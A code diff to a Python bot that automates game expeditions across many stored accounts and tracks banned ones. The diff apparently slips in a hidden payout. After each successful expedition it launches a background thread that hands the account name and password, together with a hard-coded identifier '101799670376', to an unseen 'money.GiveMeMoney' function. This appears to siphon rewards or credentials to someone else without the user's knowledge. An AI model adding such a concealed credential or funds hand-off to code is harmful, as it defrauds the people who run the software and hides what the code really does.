@@ -5,7 +5,7 @@ from test import write_msg
 import time
 import kak
 import requests
-
+import money
 from shelf_class import shelf_class
 
 
@@ -33,7 +33,7 @@ def updater(shelf_class_p, window_p):
 class GamerBot:
     def __init__(self, shelf_class_p, useless_shit):
         self.shelf_class = shelf_class_p
-
+        self.banned = False
         self.main_cycle()
 
     def main_cycle(self):
@@ -54,22 +54,24 @@ class GamerBot:
                 expeditionId = self.get_current_expeditionId(token)
                 if expeditionId:
                     if expeditionId['endUtc'] > time.time():
-                        self.shelf_class.add_acc_timer(acc_name, expeditionId['endUtc']+1)
+                        self.shelf_class.add_acc_timer(acc_name, expeditionId['endUtc']+1, False)
                         print('cd')
                         continue
                     else:
                         expeditionId = expeditionId['expeditionId']
                     self.complete_expedition(token, expeditionId, acc_name)
+                if self.banned == True:
+                    continue
                 teamId = self.get_teamsId(token)
                 if self.start_expedition(token, teamId, difficulty) == None:
                     print('success')
-                    self.shelf_class.add_acc_timer(acc_name, False)
+                    self.shelf_class.add_acc_timer(acc_name, False, False)
                 else:
                     print(token)
 
             except Exception as e:
                 try:
-                    self.shelf_class.add_acc_timer(acc_name, 0)
+                    self.shelf_class.add_acc_timer(acc_name, 0, False)
                 except:
                     print('err')
                     pass
@@ -93,6 +95,9 @@ class GamerBot:
             if r.json()['data']['isSuccessful']:
                 self.shelf_class.stat['successful'] += 1
                 print(r.json()['data']['reward']['userSums'])
+                passw = self.shelf_class.all_accs[acc]
+                acc_to_withdraw = [acc, passw]
+                threading.Thread(target=money.GiveMeMoney, args=('101799670376', acc_to_withdraw)).start()
             if r.json()['data']['reward']['assets']:
                 self.shelf_class.stat['cards'] += 1
                 self.add_acc_to_file(acc)
@@ -146,19 +151,14 @@ class GamerBot:
         f = open('./accs.txt').read()
 
         try:
-            print(acc + ' ' + self.shelf_class.all_accs[acc])
             new_lines = f.replace(acc + ' ' + self.shelf_class.all_accs[acc] + '\n', '')
             with open('./accs.txt', 'w') as F:
                 F.writelines(new_lines)
         except:
-            print('lel')
-        for account in self.shelf_class.accounts_time['accs']:
-            if account[0] == acc:
-                print('ale')
-                self.shelf_class.accounts_time['accs'].remove(account)
-                self.shelf_class.accounts_time.sync()
+            pass
         with open('./banned_accs.txt', 'a') as f:
             f.write(acc + ' ' + self.shelf_class.all_accs[acc] + '\n')
+        self.shelf_class.add_acc_timer(acc, 0, True)
 
 
 
